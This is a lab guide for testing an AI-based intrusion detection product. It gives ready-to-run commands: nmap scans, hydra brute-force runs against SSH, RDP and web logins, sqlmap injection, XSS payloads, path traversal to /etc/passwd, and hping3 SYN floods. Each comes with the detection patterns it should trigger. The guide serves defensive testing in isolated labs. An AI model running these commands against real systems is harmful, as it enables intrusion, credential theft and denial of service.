# CyberGuard AI - Lab Attack Scenarios

## ⚠️ IMPORTANT: Safe Testing Only

> [!CAUTION]
> **These attack scenarios are for TESTING PURPOSES ONLY in isolated lab environments.**
> - Never use these techniques against systems you do not own
> - Only test in isolated VMs or dedicated lab networks
> - Unauthorized testing is illegal and unethical

---

## Lab Environment Setup

### Recommended Setup
1. **Isolated Network**: Use VirtualBox/VMware with host-only networking
2. ****Test VMs**:
   - **Attacker Box**: Kali Linux (pre-installed tools)
   - **Target Box**: Windows 10/11 or Ubuntu with vulnerable apps
   - **CyberGuard Box**: Your detection system

3. **Vulnerable Applications** (for safe testing):
   - DVWA (Damn Vulnerable Web Application)
   - WebGoat
   - Metasploitable 2
   - OWASP Juice Shop

---

## Scenario 1: Port Scanning with Nmap

### Objective
Trigger network port scan detection

### Tools Required
- `nmap` (pre-installed on Kali Linux)

### Execution

```bash
# Basic SYN scan
nmap -sS -p 1-1000 TARGET_IP

# Aggressive scan
nmap -sS -T4 -p- TARGET_IP

# OS detection
nmap -O TARGET_IP

# Service version detection
nmap -sV TARGET_IP
```

### Expected Detection
- **Type**: PORT_SCAN
- **Severity**: HIGH
- **Trigger**: 10+ ports scanned in 60 seconds
- **Details**: Source IP, target IP, ports scanned count

### Verification
1. Check Dashboard → Threat Matrix
2. Look for "Port Scan" entry
3. Verify source IP matches attacker VM
4. Check 3D Network Map for threat marker

---

## Scenario 2: Brute Force Attack with Hydra

### Objective
Trigger failed authentication detection

### Setup
1. Enable SSH/RDP on target VM
2. Create user account with weak password

### Tools Required
- `hydra` (Kali Linux)

### Create Password List
```bash
# Create simple password list
cat > passwords.txt << EOF
password
123456
admin
letmein
test123
EOF
```

### Execution

#### SSH Brute Force
```bash
hydra -l admin -P passwords.txt ssh://TARGET_IP
```

#### Windows RDP Brute Force
```bash
hydra -l Administrator -P passwords.txt rdp://TARGET_IP
```

#### Web Form Brute Force
```bash
hydra -l admin -P passwords.txt TARGET_IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### Expected Detection
- **Windows Events**: Multiple Event ID 4625 (Failed Login)
- **Severity**: HIGH → CRITICAL (after 5+ attempts)
- **Type**: Brute Force Attack
- **Details**: Source IP, username, attempt count

### Verification
1. Enable Windows Event Ingestor in Settings
2. Watch real-time detections
3. Failed logins should appear within seconds
4. Sound alert for critical threat

---

## Scenario 3: SQL Injection with SQLMap

### Objective
Detect SQL injection attacks in web server logs

### Setup
1. Install DVWA on target VM
2. Set security level to "Low"
3. Configure web server log monitoring

### Tools Required
- `sqlmap` (Kali Linux)

### Execution

#### Basic SQL Injection Test
```bash
sqlmap -u "http://TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=YOUR_SESSION"
```

#### Aggressive Scan
```bash
sqlmap -u "http://TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
  --dbs --batch
```

#### Database Enumeration
```bash
sqlmap -u "http://TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
  --tables -D dvwa
```

### Expected Detection
- **Type**: SQL_INJECTION
- **Severity**: CRITICAL
- **Source**: Web Server Log Parser
- **Detection Patterns**:
  - `UNION SELECT`
  - `OR 1=1`
  - `' OR '`
  - SQL commands in URL

### Verification
1. Enable Web Server Logs in Settings
2. Configure Apache/Nginx log path
3. Check for SQL_INJECTION threats
4. Verify URL/payload in details

---

## Scenario 4: Cross-Site Scripting (XSS)

### Objective
Detect XSS attempts in web server logs

### Setup
- Use DVWA or similar vulnerable app

### Manual XSS Tests

#### Reflected XSS
```bash
# Alert box
curl "http://TARGET_IP/search?q=<script>alert(1)</script>"

# IMG tag injection
curl "http://TARGET_IP/search?q=<img src=x onerror=alert(1)>"

# Event handler
curl "http://TARGET_IP/search?q=<body onload=alert(1)>"
```

#### Stored XSS (DVWA Guest Book)
1. Navigate to DVWA → XSS Stored
2. Input: `<script>alert('XSS')</script>`
3. Submit

### Expected Detection
- **Type**: XSS
- **Severity**: HIGH
- **Patterns Detected**:
  - `<script>`
  - `javascript:`
  - `onerror=`
  - `onload=`

---

## Scenario 5: Web Scanner Detection

### Objective
Identify automated security scanners

### Tools Required
- `nikto`
- `wpscan`
- `dirb`

### Nikto Scan
```bash
nikto -h http://TARGET_IP
```

### WPScan (for WordPress)
```bash
wpscan --url http://TARGET_IP/wordpress
```

### Directory Brute Force
```bash
dirb http://TARGET_IP /usr/share/dirb/wordlists/common.txt
```

### Expected Detection
- **Type**: SCANNER_DETECTED
- **Severity**: MEDIUM
- **User-Agent Detection**:
  - Nikto/2.x.x
  - WPScan
  - Sqlmap
  - Burp Suite
  - Acunetix
  - Nessus

---

## Scenario 6: Path Traversal Attack

### Objective
Detect directory traversal attempts

### Manual Tests
```bash
# Linux path traversal
curl "http://TARGET_IP/files?file=../../../../etc/passwd"

# Windows path traversal
curl "http://TARGET_IP/files?file=..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"

# URL encoded
curl "http://TARGET_IP/files?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
```

###Expected Detection
- **Type**: PATH_TRAVERSAL
- **Severity**: HIGH
- **Patterns**:
  - `../`
  - `..\`
  - `/etc/passwd`
  - `/etc/shadow`
  - `c:\windows`

---

## Scenario 7: SYN Flood (Simulated)

### Objective
Trigger SYN flood detection

### Tools Required
- `hping3` (Kali Linux)

### Execution

#### Basic SYN Flood
```bash
sudo hping3 -S TARGET_IP -p 80 --flood
```

#### Random Source IPs
```bash
sudo hping3 -S TARGET_IP -p 80 --flood --rand-source
```

#### Specific Port Range
```bash
for port in {80..90}; do
  sudo hping3 -S TARGET_IP -p $port -c 100 &
done
```

### Expected Detection
- **Type**: SYN_FLOOD
- **Severity**: CRITICAL
- **Trigger**: 50+ SYN packets from same source in 10 seconds
- **Details**: Source IP, target IP, port, packet count

---

## Complete Attack Scenario: Multi-Stage Attack

### Timeline

**Phase 1: Reconnaissance (0-2 min)**
```bash
nmap -sS -sV -O TARGET_IP
```
→ **Detected**: Port Scan (HIGH)

**Phase 2: Service Exploitation (2-5 min)**
```bash
# Brute force SSH
hydra -l admin -P passwords.txt ssh://TARGET_IP
```
→ **Detected**: Brute Force (CRITICAL), Failed Logins (Windows Events)

**Phase 3: Web Application Attack (5-10 min)**
```bash
# SQL Injection
sqlmap -u "http://TARGET_IP/login?id=1" --batch

# XSS attempt
curl "http://TARGET_IP/search?q=<script>alert(1)</script>"
```
→ **Detected**: SQL_INJECTION (CRITICAL), XSS (HIGH)

**Phase 4: Scanner Enumeration (10-12 min)**
```bash
nikto -h http://TARGET_IP
```
→ **Detected**: SCANNER_DETECTED (MEDIUM)

### Expected Dashboard Behavior
1. **Real-time Updates**: All threats appear <5 seconds
2. **Correlation**: Threats from same source IP grouped
3. **LLM Reasoning**: Recommends blocking source IP
4. **Notifications**: Multiple toast alerts
5. **Sound Alerts**: Critical threats trigger audio
6. **3D Map**: Threat markers appear on globe

---

## Verification Checklist

After running attack scenarios:

- [ ] All attacks detected within 5 seconds
- [ ] Correct severity levels assigned
- [ ] Source IPs correctly identified
- [ ] Threat types accurately labeled
- [ ] Dashboard updates in real-time
- [ ] Notifications display properly
- [ ] Sound alerts trigger for CRITICAL
- [ ] Statistics increment correctly
- [ ] WebSocket connection stable
- [ ] No console errors
- [ ] Correlation engine groups related threats
- [ ] LLM provides meaningful recommendations

---

## Safety Reminders

✅ **DO:**
- Test in isolated VMs
- Use dedicated lab networks
- Document your findings
- Test during off-hours
- Keep backups

❌ **DON'T:**
- Test production systems
- Test without authorization
- Use against third-party systems
- Forget to isolate your lab
- Leave vulnerable systems exposed

---

## Troubleshooting

### Tools Not Working
```bash
# Update Kali Linux tools
sudo apt update && sudo apt upgrade

# Install missing tools
sudo apt install nmap hydra sqlmap nikto hping3
```

### Permission Errors
```bash
# Run with sudo
sudo nmap -sS TARGET_IP
sudo hping3 -S TARGET_IP -p 80
```

### No Detections
1. Verify log sources are enabled (Settings → Log Sources)
2. Check if running as Administrator (Windows Events, Network Capture)
3. Ensure log file paths are correct (Web Server Logs)
4. Check console for errors
5. Verify WebSocket connection is active

---

## Next Steps

1. Practice each scenario individually
2. Combine multiple attacks for realistic testing
3. Document detection accuracy
4. Fine-tune detection thresholds
5. Create custom attack patterns
6. Test remediation workflows
